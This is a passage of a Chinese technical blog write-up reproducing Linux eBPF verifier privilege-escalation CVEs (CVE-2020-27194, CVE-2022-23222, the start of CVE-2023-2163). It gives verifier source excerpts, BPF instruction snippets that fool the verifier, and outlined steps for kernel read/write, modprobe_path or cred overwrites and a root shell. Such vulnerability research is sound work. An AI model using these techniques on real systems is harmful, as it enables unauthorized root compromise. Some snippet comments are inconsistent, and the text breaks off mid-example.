+<li><p>在用户态创建<code>bpf_map</code>并在其中设置一些元数据，在内核的<code>bpf</code>程序中将上述<code>bpf_map</code>指针<code>load</code>给寄存器<code>r1</code>,</p></li>
+<li><p>初始加载两个特制的 BPF 映射作为攻击载体。主映射（文件描述符3）用作控制缓冲区，存储攻击参数和泄露的数据；辅助映射（文件描述符4）作为越界访问的跳板。在主映射中预设特定的控制值，将 <code>control_buffer_qwords[0]</code> 设置为5，。同时，程序在栈上准备临时存储空间，为后续的映射查找操作做准备</p></li>
+<li><p>利用上述<code>verifier</code>的逻辑漏洞制造一个被错误判断的<code>reg6</code>, 通过上述操作构造偏移量<code>0x110</code>越界访问<code>bpf_map</code>结构体中的元信息，泄漏内核地址，通过越界读写，覆盖元字段与<code>map_ops</code></p></li>
+<li><p>将<code>map_push_elem</code>覆盖为<code>map_get_next_key</code>触发任意地址写，更改<code>modprobe_path</code>，恢复到<code>bash</code>下在用户权限下执行错误的文件，让内核以<code>root</code>越权执行恶意文件，进而实现提权</p></li>
+</ol>
+<blockquote>
+<p>其实我们可以用另一种攻击手法，就是直接搜索 <code>init_pid_ns</code>， 找到当前的<code>task_struct</code>, 然后写 cred 来获取一个 root shell。</p>
+</blockquote>
+<p><strong>漏洞复现过程：</strong></p>
+<ol type="1">
+<li>运行<code>exp</code>更改<code>modprobe_path</code>并生成两个恶意文件</li>
+</ol>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529152113973.png" alt><figcaption>image-20250529152113973</figcaption>
+</figure>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529152249612.png" alt><figcaption>image-20250529152249612</figcaption>
+</figure>
+<ol start="2" type="1">
+<li>现在我们尝试执行<code>custom_executor</code>，里面是更改<code>flag</code>权限的命令，发现权限不够。</li>
+</ol>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529152422005.png" alt><figcaption>image-20250529152422005</figcaption>
+</figure>
+<ol start="3" type="1">
+<li>现在执行<code>probe_trigger</code>, 里面是<code>0xff 0xff 0xff 0xff</code> 是错误的指令，这时内核会触发<code>custom_executor</code>, 我们就可以获取到<code>flag</code>的内容了。</li>
+</ol>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529152554000.png" alt><figcaption>image-20250529152554000</figcaption>
+</figure>
+<h3 id="cve-2020-27194">CVE-2020-27194</h3>
+<p>漏洞复现环境：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bzImage</span>: Linux kernel x86 boot executable bzImage, version <span class="number">5</span>.<span class="number">8</span>.<span class="number">14</span> (winegee@ubuntu) #<span class="number">1</span> SMP Sun May <span class="number">13</span> <span class="number">23</span>:<span class="number">50</span>:<span class="number">27</span> PST <span class="number">2025</span>, RO-rootFS, swap_dev <span class="number">0</span>X8, Normal VGA</span><br></pre></td></tr></table></figure>
+<p>这个漏洞的成因和<code>CVE-2020-8835</code>很像，都是由于对32位的操作处理不当导致的。这个漏洞的成因是32位or运算的取值范围分析有错误：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scalar32_min_max_or</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> bpf_reg_state *src_reg)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">    <span class="type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">    s32 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">    u32 umin_val = src_reg-&gt;umin_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Assuming scalar64_min_max_or will be called so it is safe</span></span><br><span class="line"><span class="comment">     * to skip updating register for known case.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (src_known &amp;&amp; dst_known)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We get our maximum from the var_off, and our minimum is the</span></span><br><span class="line"><span class="comment">     * maximum of the operands' minima</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    dst_reg-&gt;u32_min_value = max(dst_reg-&gt;u32_min_value, umin_val);</span><br><span class="line">    dst_reg-&gt;u32_max_value = var32_off.value | var32_off.mask;</span><br><span class="line">    <span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">/* Lose signed bounds when ORing negative numbers,</span></span><br><span class="line"><span class="comment">         * ain't nobody got time for that.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">        dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        <span class="comment">/* ORing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">         * cast result into s64.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;</span><br><span class="line">        dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>在进行两个有符号正数or运算时， 最后2行代码将寄存器的64位无符号数的取值范围赋值给了32位有符号数的取值范围。</p>
+<p>那就很错了，举出上面的例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">      BPF_LD_MAP_FD(BPF_REG_9, bpf_array_map_fd), </span><br><span class="line">BPF_MAP_GET(<span class="number">0</span>, BPF_REG_5),  <span class="comment">// r5 = map_value[0]</span></span><br><span class="line">      BPF_LD_IMM64(BPF_REG_6, <span class="number">0x600000002</span>), <span class="comment">// r6 = limit</span></span><br><span class="line">      BPF_JMP_REG(BPF_JLT, BPF_REG_5, BPF_REG_6, <span class="number">1</span>), <span class="comment">// if r5 &lt; r6, continue</span></span><br><span class="line">      BPF_EXIT_INSN(),</span><br><span class="line">      BPF_JMP_IMM(BPF_JGT, BPF_REG_5, <span class="number">0</span>, <span class="number">1</span>),  <span class="comment">// if r5 &gt; 0, continue</span></span><br><span class="line">      BPF_EXIT_INSN(),</span><br><span class="line">      <span class="comment">// At this point, the verifier believes 1 &lt;= r5 &lt;= 0x600000001</span></span><br><span class="line">      <span class="comment">// However, if map_value[0] was 2 initially, r5 is 2.</span></span><br><span class="line">      BPF_ALU64_IMM(BPF_OR, BPF_REG_5, <span class="number">0</span>),   <span class="comment">// r5 |= 0. Verifier infers r5 is 1 if initial value was 1.</span></span><br><span class="line">                                             <span class="comment">// If initial value was 2, r5 is still 2.</span></span><br><span class="line">      BPF_MOV_REG(BPF_REG_6, BPF_REG_5),     <span class="comment">// r6 = r5. Verifier thinks r6 is 1. Actually 2.</span></span><br><span class="line">      BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, <span class="number">1</span>),  <span class="comment">// r6 &gt;&gt;= 1. Verifier thinks r6 is 0 (1&gt;&gt;1). Actually r6 is 1 (2&gt;&gt;1).</span></span><br><span class="line">                                             <span class="comment">// This r6 (value 1) is used as a multiplier for out-of-bounds access.</span></span><br></pre></td></tr></table></figure>
+<p><code>1 &lt;= r5 &lt;= 0x600000001</code>, 在执行<code>BPF_ALU64_IMM(BPF_OR, BPF_REG_5, 0)</code>后 就变成了<code>1 &lt;= r5 &lt;= 0x1</code></p>
+<p>后面的利用原理和<code>CVE-2020-8835</code>就一样了，只不过不同的内核版本各个指针之间的偏移可能有变化。</p>
+<p>漏洞利用思路：（完整exp见附件，具体原理见Appendix）</p>
+<ol type="1">
+<li><p>在用户态创建<code>bpf_map</code>并在其中设置一些元数据，在内核的<code>bpf</code>程序中将上述<code>bpf_map</code>指针<code>load</code>给寄存器<code>r1</code>,</p></li>
+<li><p>初始加载两个特制的 BPF 映射作为攻击载体。主映射（文件描述符3）用作控制缓冲区，存储攻击参数和泄露的数据；辅助映射（文件描述符4）作为越界访问的跳板。在主映射中预设特定的控制值，将 <code>control_buffer_qwords[0]</code> 设置为5，。同时，程序在栈上准备临时存储空间，为后续的映射查找操作做准备</p></li>
+<li><p>利用上述<code>verifier</code>的逻辑漏洞制造一个被错误判断的<code>reg6</code>, 通过上述操作构造偏移量<code>0x110</code>越界访问<code>bpf_map</code>结构体中的元信息，泄漏内核地址，通过越界读写，覆盖元字段与<code>map_ops</code></p></li>
+<li><p>搜索 <code>init_pid_ns</code>， 找到当前的<code>task_struct</code>, 覆盖<code>cred</code>结构体进而实现提权。</p></li>
+</ol>
+<figure>
+<img src="/2025/06/22/ebpf-verifier/image-20250529154907564.png" alt><figcaption>image-20250529154907564</figcaption>
+</figure>
+<h3 id="cve-2022-23222">CVE-2022-23222</h3>
+<p>复现环境</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bzImage</span>: Linux kernel x86 boot executable bzImage, version <span class="number">5</span>.<span class="number">10</span>.<span class="number">91</span> (root@iZbp1hx3qce738wmtfyf13Z) #<span class="number">1</span> SMP Sun Jun <span class="number">1</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">06</span> CST <span class="number">2025</span>, RO-rootFS, swap_dev <span class="number">0</span>X9, Normal VGA</span><br></pre></td></tr></table></figure>
+<p>在<code>verifier</code>中，会对寄存器进行指针类型检查，以禁用一些违法的指针类型进行加减操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_ptr_min_max_vals</span><span class="params">(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params">                   <span class="keyword">struct</span> bpf_insn *insn,</span></span><br><span class="line"><span class="params">                   <span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params">                   <span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *off_reg)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (ptr_reg-&gt;type) {</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_MAP_VALUE_OR_NULL:</span><br><span class="line">        verbose(env, <span class="string">"R%d pointer arithmetic on %s prohibited, null-check it first\n"</span>,</span><br><span class="line">            dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">        <span class="keyword">return</span> -EACCES;</span><br><span class="line">    <span class="keyword">case</span> CONST_PTR_TO_MAP:</span><br><span class="line">        <span class="comment">/* smin_val represents the known value */</span></span><br><span class="line">        <span class="keyword">if</span> (known &amp;&amp; smin_val == <span class="number">0</span> &amp;&amp; opcode == BPF_ADD)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        fallthrough;</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_PACKET_END:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_SOCKET:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_SOCKET_OR_NULL:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_SOCK_COMMON:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_SOCK_COMMON_OR_NULL:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_TCP_SOCK:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_TCP_SOCK_OR_NULL:</span><br><span class="line">    <span class="keyword">case</span> PTR_TO_XDP_SOCK:</span><br><span class="line">        verbose(env, <span class="string">"R%d pointer arithmetic on %s prohibited\n"</span>,</span><br><span class="line">            dst, reg_type_str[ptr_reg-&gt;type]);</span><br><span class="line">        <span class="keyword">return</span> -EACCES;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>但没有列举完所有的 <em>OR_NULL 类型指针，导致部分 </em>OR_NULL 类型指针可以进行非法运算。</p>
+<p>通过比对，发现下面这四者没有被禁用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PTR_TO_BTF_ID_OR_NULL</span><br><span class="line">PTR_TO_MEM_OR_NULL</span><br><span class="line">PTR_TO_RDONLY_BUF_OR_NULL</span><br><span class="line">PTR_TO_RDWR_BUF_OR_NULL</span><br></pre></td></tr></table></figure>
+<p>同时，在<code>verifier</code>分析条件跳转指令时，有如下调用链子：</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">check_cond_jmp_op</span> -&gt;</span> <span class="function"><span class="title">mark_ptr_or_null_regs</span> -&gt;</span> __mark_ptr_or_null_regs</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __mark_ptr_or_null_regs(<span class="keyword">struct</span> bpf_func_state *state, u32 id,</span><br><span class="line">                    <span class="type">bool</span> is_null)</span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_BPF_REG; i++)</span><br><span class="line">        mark_ptr_or_null_reg(state, &amp;state-&gt;regs[i], id, is_null);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">mark_ptr_or_null_reg</span><span class="params">(<span class="keyword">struct</span> bpf_func_state *state,</span></span><br><span class="line"><span class="params">                 <span class="keyword">struct</span> bpf_reg_state *reg, u32 id,</span></span><br><span class="line"><span class="params">                 <span class="type">bool</span> is_null)</span></span><br><span class="line">{</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (WARN_ON_ONCE(reg-&gt;smin_value || reg-&gt;smax_value ||</span><br><span class="line">                 !tnum_equals_const(reg-&gt;var_off, <span class="number">0</span>) ||</span><br><span class="line">                 reg-&gt;off)) {</span><br><span class="line">            __mark_reg_known_zero(reg);</span><br><span class="line">            reg-&gt;off = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (is_null) {</span><br><span class="line">            reg-&gt;type = SCALAR_VALUE;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>也就是说，当<code>verifier</code>在分析*_OR_NULL类型指针与0的比较时，在其中一条分支中，<code>reg_state-&gt;type</code>总会变成<code>SCALAR_VALUE</code>, 其值也会被认为是0。同时，在该条分支中，会同时对所有具有相同<code>id</code>的寄存器做一样的处理。</p>
+<blockquote>
+<p><code>id</code>是<code>reg_state</code>中对寄存器类型进行跟踪的字段，它表示着该寄存器类型的来源，在用户程序对寄存器进行一些操作时，便于<code>verifier</code>更好地对寄存器进行"连坐"式的检查。</p>
+<p>举个例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0), <span class="comment">// r0 是 PTR_TO_MEM_OR_NULL类型指针 值为0(NULL)</span></span><br><span class="line"><span class="comment">// 此时 r1-&gt;type = r0-&gt;type / r1-&gt;id = r0-&gt;id</span></span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>), <span class="comment">// r1 = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if (r0 != NULL) {}</span></span><br><span class="line">BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">...... <span class="comment">// 5 insns</span></span><br><span class="line"><span class="comment">// 这时verfier认为r0-&gt;type = SCALAR_VALUE r0-&gt;var_off = {0, 0xffffffff}</span></span><br><span class="line"><span class="comment">// 同时verifier发现r1-&gt;id = r0-&gt;id, 那么在该条分支下，verifier认为</span></span><br><span class="line"><span class="comment">// r1-&gt;var_off = r0-&gt;var_off, r1-&gt;type = r0-&gt;type 但在运行时r1的值是1</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>但由于上述对*_OR_NULL类型限制不全的漏洞，导致在该条分支中，如果一个寄存器的值不是0，那么也会被认为是0，我们可以通过创造这几类指针类型的寄存器，来触发越界读写的漏洞。</p>
+<p>首先我们需要准备一个*_OR_NULL类型的寄存器，观察到有<code>bpf_ringbuf_reverse()</code>函数，我们可以通过这个函数去获取<code>PTR_TO_MEM_OR_NULL</code>类型的指针</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx-&gt;ringbuf_fd = bpf_create_map(BPF_MAP_TYPE_RINGBUF, <span class="number">0</span>, <span class="number">0</span>, PAGE_SIZE)</span><br></pre></td></tr></table></figure>
+<p>官方文档对<code>bpf_ringbuf_reverse()</code>函数的介绍：</p>
+<blockquote>
+<p><code>bpf_ringbuf_reserve()</code> avoids the extra copy of memory by providing a memory pointer directly to ring buffer memory. In a lot of cases records are larger than BPF stack space allows, so many programs have use extra per-CPU array as a temporary heap for preparing sample. bpf_ringbuf_reserve() avoid this needs completely. But in exchange, it only allows a known constant size of memory to be reserved, such that verifier can verify that BPF program can’t access memory outside its reserved record space. bpf_ringbuf_output(), while slightly slower due to extra memory copy, covers some use cases that are not suitable for <code>bpf_ringbuf_reserve()</code>.</p>
+</blockquote>
+<p>接下来通过一系列操作创建一个越狱的寄存器：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r0 = bpf_ringbuf_reserve(ctx-&gt;ringbuf_fd, PAGE_SIZE, 0)</span></span><br><span class="line">BPF_LD_MAP_FD(BPF_REG_1, ctx-&gt;ringbuf_fd),</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, PAGE_SIZE),</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_3, <span class="number">0x00</span>),</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_reserve),</span><br><span class="line"></span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line"><span class="comment">// if (r0 != NULL) { ringbuf_discard(r0, 1); exit(2); }</span></span><br><span class="line">BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_2, <span class="number">1</span>),</span><br><span class="line">BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, BPF_FUNC_ringbuf_discard),</span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">2</span>),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure>
+<p>我们需要在运行时保证<code>r0</code>一定是<code>NULL</code>——我们在调用<code>bpf_ringbuf_reverse</code>中直接要求申请一个<code>PAGE_SIZE</code>大小的块，因为一个<code>PAGE</code>里面一定是存有一些原始数据的，所以一定是不够分的，所以就一定是返回<code>NULL</code>的。</p>
+<p>之后我们就可以去构建任意读写的原语，通过<code>partial overlap</code>操纵一个内核指针来完成一系列提权操作。</p>
+<p><strong>漏洞复现流程：（具体细节见Appendix）</strong></p>
+<ol type="1">
+<li>创建 BPF Maps 并泄露内核地址，创建 BPF_MAP_TYPE_ARRAY (通信) 和 BPF_MAP_TYPE_RINGBUF (触发漏洞)。加载 eBPF 程序，利用<code>verifier</code> 和运行时 <code>runtime</code> 的不一致性 <code>verifier bypass</code>，通过 <code>ringbuf</code> 和 <code>skb_load_bytes_relative</code> 等操作，从栈上部分覆写数据，最终泄露内核中某个 <code>array_map</code> 的实际地址。</li>
+<li>基于泄露的内核 map 地址和类似的 verifier bypass 技巧，加载新的 eBPF 程序, 将 BPF map 操作（如读/写 map 元素）重定向到任意指定的内核内存地址，从而实现对内核内存的任意读和任意写。</li>
+<li>创建多个子进程，并让它们暂停，使用已获得的任意读能力，在内核中扫描并定位到当前利用程序某个子进程的 cred 结构体（包含 UID, GID 等权限信息）。使用任意写能力，将该 cred 结构体中的 UID, GID, EUID, EGID 等字段修改为 0 (root 权限)。</li>
+<li>唤醒之前暂停的、其 cred 已被修改为 root 的子进程。其中一个子进程执行 system("/bin/sh")，从而以 root 权限启动一个新的 shell。</li>
+</ol>
+<h3 id="cve-2023-2163">CVE-2023-2163</h3>
+<p>漏洞复现环境：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bzImage</span>: Linux kernel x86 boot executable bzImage, version <span class="number">6</span>.<span class="number">3</span>.<span class="number">0</span>-rc6 (root@iZbp1hx3qce738wmtfyf13Z) #<span class="number">3</span> SMP PREEMPT_DYNAMIC Sun Jun  <span class="number">1</span> <span class="number">15</span>:<span class="number">30</span>:<span class="number">12</span> CST <span class="number">2025</span>, ROA</span><br></pre></td></tr></table></figure>
+<p>改漏洞发生于<code>verifier</code>对路径剪枝的逻辑中：(关于寄存器精确标记详见Appendix.E)</p>
+<blockquote>
+<p>我们输入的<code>bpf</code>程序会被<code>verifier</code>进行静态分析，将程序解析成代码块与抽象语法树的形式。</p>
+<p>假设我们有如下程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r6 = <span class="number">1</span>                        <span class="comment">// r6 = 1</span></span><br><span class="line"><span class="number">1</span>: (b7) r7 = <span class="number">2</span>                        <span class="comment">// r7 = 2</span></span><br><span class="line"><span class="number">2</span>: (b7) r8 = <span class="number">0</span>                        <span class="comment">// r8 = 0</span></span><br><span class="line"><span class="number">3</span>: (b5) <span class="keyword">if</span> r6 == <span class="number">1</span> <span class="keyword">goto</span> pc+<span class="number">2</span>          <span class="comment">// if r6 == 1, 跳转到 6</span></span><br><span class="line"><span class="number">4</span>: (b7) r6 = <span class="number">0</span>                        <span class="comment">// r6 = 0</span></span><br><span class="line"><span class="number">5</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc+<span class="number">2</span>                     <span class="comment">// 跳转到 8</span></span><br><span class="line"><span class="number">6</span>: (b7) r7 = <span class="number">0</span>                        <span class="comment">// r7 = 0</span></span><br><span class="line"><span class="number">7</span>: (b7) r6 = <span class="number">0</span>                        <span class="comment">// r6 = 0</span></span><br><span class="line"><span class="number">8</span>: (<span class="number">18</span>) r1 = <span class="number">0xffff888123456789</span>       <span class="comment">// r1 = 映射指针 (ks=4, vs=8)</span></span><br><span class="line"><span class="number">10</span>: (bf) r2 = r10                     <span class="comment">// r2 = 栈指针</span></span><br><span class="line"><span class="number">11</span>: (<span class="number">07</span>) r2 += <span class="number">-4</span>                     <span class="comment">// r2 = r10 - 4</span></span><br><span class="line"><span class="number">12</span>: (<span class="number">63</span>) *(u32 *)(r10 - <span class="number">4</span>) = r8       <span class="comment">// 栈写入 r8 (0)</span></span><br><span class="line"><span class="number">13</span>: (<span class="number">85</span>) call bpf_map_lookup_elem#<span class="number">1</span>   <span class="comment">// 调用映射查找，r0 = 映射值</span></span><br><span class="line"><span class="number">14</span>: (<span class="number">55</span>) <span class="keyword">if</span> r0 != <span class="number">0x0</span> <span class="keyword">goto</span> pc+<span class="number">1</span>       <span class="comment">// if r0 非空，跳转到 16</span></span><br><span class="line"><span class="number">15</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br><span class="line"><span class="number">16</span>: (<span class="number">7b</span>) *(u64 *)(r0 + <span class="number">0</span>) = r6        <span class="comment">// 写入 r6 到 r0</span></span><br><span class="line"><span class="number">17</span>: (<span class="number">95</span>) <span class="built_in">exit</span>                         <span class="comment">// 退出</span></span><br></pre></td></tr></table></figure>
+<p><code>verifier</code>将上述程序解析为抽象语法树，并对每个分支做迭代探索与验证：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Root (指令 <span class="number">0</span><span class="number">-2</span>)</span><br><span class="line">R6=<span class="number">1</span>, R7=<span class="number">2</span> (R6: P, R7: 非精确)</span><br><span class="line">↓</span><br><span class="line">指令 <span class="number">3</span> (<span class="keyword">if</span> r6 == <span class="number">1</span>)</span><br><span class="line">├── 跳转到 <span class="number">6</span> (r6 == <span class="number">1</span>)</span><br><span class="line">│   指令 <span class="number">6</span><span class="number">-7</span>: R6=<span class="number">0</span>, R7=<span class="number">0</span> (R6: P, R7: 非精确)</span><br><span class="line">│   指令 <span class="number">8</span>: R6=<span class="number">0</span>, R7=<span class="number">0</span></span><br><span class="line">│   ↓</span><br><span class="line">│   指令 <span class="number">14</span> (<span class="keyword">if</span> r0 != <span class="number">0</span>)</span><br><span class="line">│     ├── 跳转到 <span class="number">16</span>: R6=<span class="number">0</span> → 写入 r0 + <span class="number">0</span>, 安全</span><br><span class="line">│     └── 退出: 安全</span><br><span class="line">└── 继续到 <span class="number">4</span> (r6 != <span class="number">1</span>)</span><br><span class="line">   指令 <span class="number">4</span><span 